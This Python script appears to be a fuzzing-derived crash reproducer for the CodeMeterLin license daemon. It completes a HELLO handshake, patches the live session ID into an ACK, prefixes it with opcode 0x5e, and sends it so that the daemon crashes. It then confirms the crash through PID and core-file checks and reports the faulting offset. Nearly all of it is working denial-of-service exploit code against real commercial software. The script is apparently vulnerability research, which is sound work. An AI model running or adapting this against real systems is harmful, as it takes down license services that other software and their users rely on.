#!/usr/bin/env python3
"""Two-frame reproducer candidate for the ACK-side opcode-0x5e crash.

This is the ACK analogue of repro_prefixed_hello.py:

1. Send a normal, fresh-token HELLO.
2. Decrypt the daemon response and extract SID0.
3. Patch SID0 into the canonical 8-byte ACK.
4. Send a mutated ACK cleartext:

       5e <captured filler bytes> || canonical ACK with fresh SID0

The default prefix is one of the farm_02 ACK candidates:

    5e 8d 0a ae 35 94 40 11 f8 8e 14 14 c1 a6 bb

so the final ACK plaintext has this shape:

    5e 8d 0a ae 35 94 40 11 f8 8e 14 14 c1 a6 bb
    0b 00 00 00 XX XX XX XX

where XX XX XX XX is the live SID returned by the current daemon.

Use --prefix to test minimization hypotheses, for example:

    --prefix 5e
    --prefix 5e0000000000000000000000000000

This intentionally crashes CodeMeterLin when the ACK-side observation is
reproducible on the target host.
"""

from __future__ import annotations

import argparse
import importlib.util
import os
from pathlib import Path
import socket
import subprocess
import sys
import time


# Prefixes copied from the ACK-side farm candidates. Each is prepended before
# the canonical 8-byte ACK after SID patching.
SAMPLE_ACK_PREFIXES = [
    "5e8d0aae35944011f88e1414c1a6bb",
    "5e756de599689e5d5345e153887656",
    "5ef12e17f59c10ce27b49c8ade1dc3",
]


def load_samc(helper_path: Path):
    """Import the SAMC helper module used by the fuzzer.

    The helper supplies captured canonical plaintexts plus the transport
    crypto/framing routines. The vulnerable input is the decrypted ACK
    plaintext assembled in this file; the helper only makes the daemon accept
    the frame as a valid SAMC client-to-daemon message.
    """
    helper_path = helper_path.resolve()
    sys.path.insert(0, str(helper_path.parent))
    spec = importlib.util.spec_from_file_location("samc_fuzz_for_ack_repro", helper_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {helper_path}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def codemeter_pid() -> int | None:
    """Return the real CodeMeterLin PID, or None if the daemon is gone."""
    try:
        out = subprocess.check_output(["pgrep", "-x", "CodeMeterLin"], text=True, timeout=1)
    except Exception:
        return None
    pids = [int(tok) for tok in out.split() if tok.isdigit()]
    return pids[0] if pids else None


def newest_core() -> tuple[str, int, int] | None:
    """Return the newest local CodeMeter core-like file."""
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def recv_decrypted_response(samc, sock: socket.socket, timeout: float) -> bytes | None:
    """Receive one daemon-to-client frame and return decrypted plaintext."""
    resp = samc.recv_one_wire_frame(sock, timeout=timeout)
    if resp is None:
        return None
    return samc.decrypt_d2c_frame(resp, int(time.time()))


def print_ack_explanation(prefix: bytes, canonical_ack: bytes, mutated_ack: bytes,
                          token: bytes, sid: bytes) -> None:
    print("=== cleartext mutation ===")
    print(f"fresh_client_token={token.hex()}")
    print(f"sid0={sid.hex()}")
    print(f"prefix_hex={prefix.hex()}")
    print(f"prefix_len={len(prefix)}")
    print(f"canonical_ack_len={len(canonical_ack)}")
    print(f"canonical_ack_hex={canonical_ack.hex()}")
    print(f"mutated_ack_len={len(mutated_ack)}")
    print(f"mutated_ack_hex={mutated_ack.hex()}")
    print(f"mutated_ack_starts_with_0x5e={bool(mutated_ack) and mutated_ack[0] == 0x5e}")
    print(f"canonical_ack_tail_offset=0x{len(prefix):x}")
    print()
    print("Interpretation:")
    print("  The HELLO is unmodified except for its normal fresh client token.")
    print("  The daemon-issued SID is patched into the canonical ACK at offset 4.")
    print("  The ACK plaintext is then prefixed so byte 0 is opcode 0x5e.")
    print("  Candidate farm crashes with this shape reached CodeMeterLin+0x8f431d.")
    print()


def main() -> int:
    default_helper = Path(__file__).with_name("samc_fuzz.py")
    ap = argparse.ArgumentParser(
        description="Send normal HELLO, then a crafted ACK whose first byte is 0x5e.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 fuzzer/repro_ack_0x5e.py
  python3 fuzzer/repro_ack_0x5e.py --sample-prefix 1
  python3 fuzzer/repro_ack_0x5e.py --prefix 5e
  python3 fuzzer/repro_ack_0x5e.py --prefix 5e0000000000000000000000000000
""",
    )
    ap.add_argument("--samc-helper", default=str(default_helper),
                    help="path to samc_fuzz.py providing crypto/session helpers")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=22350)
    ap.add_argument("--prefix", default=None,
                    help="hex bytes to prepend before the SID-patched canonical ACK")
    ap.add_argument("--sample-prefix", type=int, choices=[0, 1, 2], default=0,
                    help="captured ACK prefix to use when --prefix is not set")
    ap.add_argument("--response-timeout", type=float, default=2.0)
    ap.add_argument("--wait", type=float, default=10.0,
                    help="seconds to wait for PID/core crash evidence after ACK send")
    args = ap.parse_args()

    samc = load_samc(Path(args.samc_helper))

    if args.prefix is None:
        prefix_hex = SAMPLE_ACK_PREFIXES[args.sample_prefix]
    else:
        prefix_hex = args.prefix
    prefix = bytes.fromhex(prefix_hex)
    if not prefix:
        raise SystemExit("--prefix must not be empty")
    if prefix[0] != 0x5e:
        print(f"warning: prefix starts with 0x{prefix[0]:02x}, not 0x5e", file=sys.stderr)

    before_pid = codemeter_pid()
    before_core = newest_core()

    token = os.urandom(samc.HELLO_TOKEN_LEN)
    hello = samc.substitute_token(0, samc.CAPTURED_SESSION_C2D[0], token)

    print("=== daemon baseline ===")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(args.response_timeout)
    sock.connect((args.host, args.port))
    try:
        print("=== send HELLO ===")
        hello_wire = samc.encrypt_c2d_frame(hello, int(time.time()))
        print(f"hello_plaintext_len={len(hello)}")
        print(f"hello_wire_len={len(hello_wire)}")
        sock.sendall(hello_wire)

        hello_inner = recv_decrypted_response(samc, sock, args.response_timeout)
        print(f"hello_response_inner_len={None if hello_inner is None else len(hello_inner)}")
        if hello_inner is None or len(hello_inner) < 8:
            print("cannot extract SID0 from HELLO response; aborting before ACK")
            return 2

        sid = bytes(hello_inner[4:8])
        canonical_ack = samc.apply_sid_patches(1, samc.CAPTURED_SESSION_C2D[1], [sid])
        mutated_ack = prefix + canonical_ack
        print_ack_explanation(prefix, canonical_ack, mutated_ack, token, sid)

        print("=== send ACK ===")
        ack_wire = samc.encrypt_c2d_frame(mutated_ack, int(time.time()))
        print(f"ack_wire_len={len(ack_wire)}")
        sock.sendall(ack_wire)

        try:
            ack_inner = recv_decrypted_response(samc, sock, args.response_timeout)
            print(f"ack_response_inner_len={None if ack_inner is None else len(ack_inner)}")
            if ack_inner is not None:
                print(f"ack_response_inner_hex={ack_inner.hex()}")
        except Exception as exc:
            print(f"ack_recv_exception={type(exc).__name__}:{exc}")
    finally:
        sock.close()

    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print()
    print("=== crash oracle ===")
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    if crashed:
        print()
        print("Expected GDB facts for the resulting core:")
        print("  #1 CodeMeterLin + 0x8f431d")
        print("  ACK cleartext byte 0 = 0x5e")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
